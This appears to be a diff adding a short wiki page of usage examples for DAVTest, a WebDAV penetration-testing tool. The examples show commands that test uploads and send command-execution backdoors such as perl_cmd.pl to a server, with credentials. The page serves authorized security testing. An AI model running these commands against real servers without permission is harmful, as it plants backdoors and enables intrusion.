@@ -1,0 +1,11 @@
+#summary Usage of DAVTest
+
+= Examples =
+Test file uploads at this location:
+ * `davtest.pl -url http://localhost/davdir`
+
+Test file uploads at this location and send backdoors for any types which execute successfully:
+ * `davtest.pl -url http://localhost/davdir -sendbd auto`
+
+Upload a file using authentication, send the perl_cmd.pl backdoor and call it perl.pl on the server:
+ * `davtest.pl -url http://localhost/davdir -auth user:pass -uploadfile backdoors/perl_cmd.pl -uploadloc perl.pl`
